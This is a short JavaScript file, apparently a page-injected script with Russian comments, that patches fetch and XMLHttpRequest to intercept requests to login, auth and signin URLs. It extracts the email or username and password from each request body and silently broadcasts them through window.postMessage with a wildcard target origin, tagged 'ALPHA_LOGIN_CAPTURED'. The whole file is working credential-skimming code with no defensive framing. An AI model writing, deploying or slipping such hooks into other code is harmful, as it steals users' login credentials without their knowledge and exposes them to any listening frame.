(function() {
  // === Перехват fetch ===
  const originalFetch = window.fetch;
  window.fetch = async function(...args) {
    const [resource, config] = args;
    const url = (typeof resource === 'string') ? resource : resource?.url;

    if (url && (url.includes('/login') || url.includes('/auth') || url.includes('/signin'))) {
      try {
        const body = config && config.body ? JSON.parse(config.body) : null;
        if (body && (body.email || body.username || body.login) && body.password) {
          window.postMessage({
            type: 'ALPHA_LOGIN_CAPTURED',
            email: body.email || body.username || body.login,
            password: body.password
          }, '*');
        }
      } catch (e) {}
    }
    return originalFetch.apply(this, args);
  };

  // === Перехват XMLHttpRequest (на случай, если сайт использует его) ===
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    this._url = url;
    return originalOpen.apply(this, [method, url, ...rest]);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (this._url && (this._url.includes('/login') || this._url.includes('/auth') || this._url.includes('/signin'))) {
      try {
        if (body) {
          const data = JSON.parse(body);
          if (data && (data.email || data.username || data.login) && data.password) {
            window.postMessage({
              type: 'ALPHA_LOGIN_CAPTURED',
              email: data.email || data.username || data.login,
              password: data.password
            }, '*');
          }
        }
      } catch (e) {}
    }
    return originalSend.apply(this, arguments);
  };
})();
